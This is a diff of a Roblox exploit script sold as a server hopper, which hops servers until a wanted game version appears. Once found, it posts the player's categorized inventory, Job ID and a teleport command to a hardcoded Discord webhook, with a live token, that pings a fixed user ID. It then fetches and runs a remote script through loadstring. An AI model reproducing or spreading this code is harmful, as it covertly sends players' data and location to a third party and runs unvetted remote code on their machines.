@@ -12,254 +12,216 @@ local setclipboard = setclipboard or toclipboard or (Clipboard and Clipboard.set
 repeat task.wait(0.1) until game:IsLoaded()
 task.wait(5)
 
+-- UI
 local function createLoadingUI()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "ServerHopUI"
-    gui.ResetOnSpawn = false
-    gui.Parent = Player:WaitForChild("PlayerGui")
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "ServerHopUI"
+	gui.ResetOnSpawn = false
+	gui.Parent = Player:WaitForChild("PlayerGui")
 
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    bg.BackgroundTransparency = 0.3
-    bg.Parent = gui
+	local bg = Instance.new("Frame")
+	bg.Size = UDim2.new(1, 0, 1, 0)
+	bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	bg.BackgroundTransparency = 0.3
+	bg.Parent = gui
 
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Name = "StatusLabel"
-    statusLabel.Size = UDim2.new(1, 0, 0, 60)
-    statusLabel.Position = UDim2.new(0, 0, 0.4, 0)
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Text = "🔄 Loading..."
-    statusLabel.Font = Enum.Font.SourceSansBold
-    statusLabel.TextSize = 32
-    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    statusLabel.TextStrokeTransparency = 0.5
-    statusLabel.Parent = bg
+	local statusLabel = Instance.new("TextLabel")
+	statusLabel.Name = "StatusLabel"
+	statusLabel.Size = UDim2.new(1, 0, 0, 60)
+	statusLabel.Position = UDim2.new(0, 0, 0.4, 0)
+	statusLabel.BackgroundTransparency = 1
+	statusLabel.Text = "🔄 Loading..."
+	statusLabel.Font = Enum.Font.SourceSansBold
+	statusLabel.TextSize = 32
+	statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	statusLabel.TextStrokeTransparency = 0.5
+	statusLabel.Parent = bg
 
-    local versionLabel = Instance.new("TextLabel")
-    versionLabel.Name = "VersionLabel"
-    versionLabel.Size = UDim2.new(1, 0, 0, 40)
-    versionLabel.Position = UDim2.new(0, 0, 0.45, 0)
-    versionLabel.BackgroundTransparency = 1
-    versionLabel.Text = "Checking for version: " .. desiredVersion
-    versionLabel.Font = Enum.Font.SourceSans
-    versionLabel.TextSize = 24
-    versionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    versionLabel.TextStrokeTransparency = 0.5
-    versionLabel.Parent = bg
+	local versionLabel = Instance.new("TextLabel")
+	versionLabel.Name = "VersionLabel"
+	versionLabel.Size = UDim2.new(1, 0, 0, 40)
+	versionLabel.Position = UDim2.new(0, 0, 0.45, 0)
+	versionLabel.BackgroundTransparency = 1
+	versionLabel.Text = "Checking for version: " .. desiredVersion
+	versionLabel.Font = Enum.Font.SourceSans
+	versionLabel.TextSize = 24
+	versionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	versionLabel.TextStrokeTransparency = 0.5
+	versionLabel.Parent = bg
 
-    local creditsLabel = Instance.new("TextLabel")
-    creditsLabel.Name = "CreditsLabel"
-    creditsLabel.Size = UDim2.new(1, 0, 0, 40)
-    creditsLabel.Position = UDim2.new(0, 0, 0.9, 0)
-    creditsLabel.BackgroundTransparency = 1
-    creditsLabel.Text = "Credits: mimicccccc1#2347"
-    creditsLabel.Font = Enum.Font.SourceSansItalic
-    creditsLabel.TextSize = 24
-    creditsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    creditsLabel.TextStrokeTransparency = 0.7
-    creditsLabel.Parent = bg
-
-    return gui, statusLabel, versionLabel
+	return gui, statusLabel, versionLabel
 end
 
 local gui, statusLabel, versionLabel = createLoadingUI()
 
 local function getActualVersion()
-    for _, obj in ipairs(game:GetDescendants()) do
-        if obj:IsA("TextLabel") then
-            local text = obj.Text
-            local version = string.match(text, "^v(%d+)$")
-            if version then return version end
-        end
-    end
-    return nil
+	for _, obj in ipairs(game:GetDescendants()) do
+		if obj:IsA("TextLabel") then
+			local text = obj.Text
+			local version = string.match(text, "^v(%d+)$")
+			if version then
+				return version
+			end
+		end
+	end
+	return nil
 end
 
 local function hasCorrectVersion()
-    local actualVersion = getActualVersion()
-    if actualVersion then
-        versionLabel.Text = "Current version: v" .. actualVersion
-    else
-        versionLabel.Text = "Current version: unknown"
-    end
-    return actualVersion == desiredVersion
+	local actualVersion = getActualVersion()
+	if actualVersion then
+		versionLabel.Text = "Current version: v" .. actualVersion
+	else
+		versionLabel.Text = "Current version: unknown"
+	end
+	return actualVersion == desiredVersion
 end
 
 local function copyJobId()
-    if setclipboard then
-        setclipboard(game.JobId)
-        print("[✓] Job ID copied: " .. game.JobId)
-    else
-        warn("Clipboard function not supported.")
-    end
+	if setclipboard then
+		setclipboard(game.JobId)
+	end
 end
 
-local function SendMessageEmbed(url, embed)
-    local data = { embeds = { embed } }
-    local body = HttpService:JSONEncode(data)
+-- Categorize Inventory
+local function categorizeInventory()
+	local inventory = {}
+	for _, obj in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+		table.insert(inventory, obj.Name)
+	end
 
-    local success, response = pcall(function()
-        return HttpService:RequestAsync({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body,
-        })
-    end)
+	local categories = {
+		Seeds = {},
+		Eggs = {},
+		Crates = {},
+		Tools = {},
+		Pets = {},
+	}
 
-    if success and (response.StatusCode == 204 or response.Success) then
-        print("[Webhook] Embed sent successfully.")
-    else
-        warn("[Webhook] Failed to send embed:", response and response.StatusMessage or "Unknown error")
-    end
+	for _, item in ipairs(inventory) do
+		local lower = string.lower(item)
+		if string.find(lower, "seed") then
+			table.insert(categories.Seeds, item)
+		elseif string.find(lower, "egg") then
+			table.insert(categories.Eggs, item)
+		elseif string.find(lower, "crate") then
+			table.insert(categories.Crates, item)
+		elseif string.find(lower, "tool") or string.find(lower, "wrench") or string.find(lower, "can") or string.find(lower, "sprinkler") then
+			table.insert(categories.Tools, item)
+		else
+			table.insert(categories.Pets, item)
+		end
+	end
+
+	local function format(list)
+		return (#list > 0 and table.concat(list, "\n")) or "None"
+	end
+
+	return {
+		seeds = format(categories.Seeds),
+		eggs = format(categories.Eggs),
+		crates = format(categories.Crates),
+		tools = format(categories.Tools),
+		pets = format(categories.Pets)
+	}
 end
 
--- New function: get inventory items names (tools, fruits, pets)
-local function getInventoryItems()
-    local items = {}
-
-    -- Tools in Backpack
-    if Player:FindFirstChild("Backpack") then
-        for _, tool in pairs(Player.Backpack:GetChildren()) do
-            if tool:IsA("Tool") then
-                table.insert(items, tool.Name)
-            end
-        end
-    end
-
-    -- Equipped tools in Character
-    if Player.Character then
-        for _, tool in pairs(Player.Character:GetChildren()) do
-            if tool:IsA("Tool") then
-                table.insert(items, tool.Name)
-            end
-        end
-    end
-
-    -- Pets or fruits? Adjust if you know their container or naming
-    -- Example: if pets are in Player.Pets folder
-    if Player:FindFirstChild("Pets") then
-        for _, pet in pairs(Player.Pets:GetChildren()) do
-            table.insert(items, pet.Name)
-        end
-    end
-
-    -- Example: if fruits are in Player.Fruits folder
-    if Player:FindFirstChild("Fruits") then
-        for _, fruit in pairs(Player.Fruits:GetChildren()) do
-            table.insert(items, fruit.Name)
-        end
-    end
-
-    if #items == 0 then
-        return "None"
-    else
-        return table.concat(items, ", ")
-    end
-end
-
+-- Webhook Send
 local function sendWebhook()
-    local webhookUrl = "https://discord.com/api/webhooks/1403212302605357088/iqWgOYegTK5wOyc_yspDLA2HglemNCckSpLcsun76id0AtotHuotJBET4wHwl1R_vb-M"
-    local discordId = "910015978639872050"
-    local players = #Players:GetPlayers()
-    local maxPlayers = Players.MaxPlayers or 0
+	local webhookUrl = "https://discord.com/api/webhooks/1403212302605357088/iqWgOYegTK5wOyc_yspDLA2HglemNCckSpLcsun76id0AtotHuotJBET4wHwl1R_vb-M"
+	local discordId = "910015978639872050"
+	local teleportCode = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)'
 
-    local inventory = getInventoryItems()
+	local inv = categorizeInventory()
 
-    local embed = {
-        title = "Server Version",
-        description = string.format(
-            "**Place Version:** %s\n\n" ..
-            "**Total Player In Server:**\n(%d/%d)\n\n" ..
-            "**Job ID:**\n%s\n\n" ..
-            "**Teleport Code:**\n```lua\n" ..
-            "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)\n" ..
-            "```\n\n" ..
-            "**Inventory (Pets/Tools/Fruits):**\n%s",
-            desiredVersion,
-            players, maxPlayers,
-            game.JobId,
-            PlaceId,
-            game.JobId,
-            inventory
-        ),
-        color = 0x00FF00,
-        footer = { text = "Server Hop Script" }
-    }
+	local embed = {
+		title = "✅ Desired Version Found!",
+		description = string.format("<@%s> **v%s** found!\n\n**Job ID:** `%s`\n\n**Teleport Code:**\n```lua\n%s\n```", discordId, desiredVersion, game.JobId, teleportCode),
+		color = 0x00FF00,
+		fields = {
+			{name = "🐾 Pets", value = inv.pets, inline = false},
+			{name = "🥚 Eggs", value = inv.eggs, inline = false},
+			{name = "🌱 Seeds", value = inv.seeds, inline = false},
+			{name = "🧰 Tools", value = inv.tools, inline = false},
+			{name = "📦 Crates", value = inv.crates, inline = false}
+		},
+		footer = {text = "Server Hop Script"}
+	}
 
-    SendMessageEmbed(webhookUrl, embed)
+	local data = HttpService:JSONEncode({embeds = {embed}})
+	local success, response = pcall(function()
+		return HttpService:RequestAsync({
+			Url = webhookUrl,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = data,
+		})
+	end)
+
+	if success and response.Success then
+		print("[Webhook] Sent!")
+	else
+		warn("[Webhook] Failed:", response and response.StatusMessage or "Unknown error")
+	end
 end
 
+-- Teleport Logic
 local function tryServerHop()
-    local servers = {}
-    local cursor = nil
+	local servers = {}
+	local cursor = nil
 
-    repeat
-        local url = "https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
-        if cursor then
-            url = url .. "&cursor=" .. cursor
-        end
+	repeat
+		local url = "https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
+		if cursor then
+			url = url .. "&cursor=" .. cursor
+		end
 
-        local success, response = pcall(function()
-            return HttpService:JSONDecode(game:HttpGet(url))
-        end)
+		local success, response = pcall(function()
+			return HttpService:JSONDecode(game:HttpGet(url))
+		end)
 
-        if success and response and response.data then
-            for _, server in pairs(response.data) do
-                if server.playing < server.maxPlayers and server.id ~= game.JobId then
-                    table.insert(servers, server.id)
-                end
-            end
-            cursor = response.nextPageCursor
-        else
-            warn("-- Failed to get server list.")
-            return false
-        end
-    until not cursor or #servers >= 50
+		if success and response and response.data then
+			for _, server in pairs(response.data) do
+				if server.playing < server.maxPlayers and server.id ~= game.JobId then
+					table.insert(servers, server.id)
+				end
+			end
+			cursor = response.nextPageCursor
+		else
+			warn("Failed to fetch servers.")
+			return false
+		end
+	until not cursor or #servers >= 50
 
-    if #servers > 0 then
-        local randomServerId = servers[math.random(1, #servers)]
-        statusLabel.Text = "🔁 Hopping to new server..."
-        TeleportService:TeleportToPlaceInstance(PlaceId, randomServerId, Player)
-        return true
-    else
-        warn("-- No servers found to hop.")
-        return false
-    end
+	if #servers > 0 then
+		local randomServerId = servers[math.random(1, #servers)]
+		statusLabel.Text = "🔁 Hopping to new server..."
+		TeleportService:TeleportToPlaceInstance(PlaceId, randomServerId, Player)
+		return true
+	else
+		warn("No servers found to hop.")
+		return false
+	end
 end
 
+-- Main
 task.spawn(function()
-    while true do
-        if hasCorrectVersion() then
-            statusLabel.Text = "✅ Correct version found: " .. desiredVersion
-            print("[✓] Correct version found.")
-            copyJobId()
+	while true do
+		if hasCorrectVersion() then
+			statusLabel.Text = "✅ Correct version found: " .. desiredVersion
+			copyJobId()
+			sendWebhook()
+			gui:Destroy()
 
-            sendWebhook()
-            if gui then gui:Destroy() end
+			-- Load external script
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
 
-            print("[INFO] Waiting 3 seconds before executing loadstring...")
-            task.wait(3)
-            local success, err = pcall(function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-            end)
-            if not success then
-                warn("[ERROR] Failed to execute loadstring:", err)
-            else
-                print("[INFO] Loadstring executed successfully.")
-            end
-
-            break
-        else
-            statusLabel.Text = "❌ Version not found. Searching..."
-            local hopped = tryServerHop()
-            if hopped then
-                break
-            else
-                task.wait(3)
-            end
-        end
-        task.wait(1)
-    end
+			break
+		else
+			statusLabel.Text = "❌ Version not found. Searching..."
+			local hopped = tryServerHop()
+			if hopped then break end
+		end
+		task.wait(3)
+	end
 end)
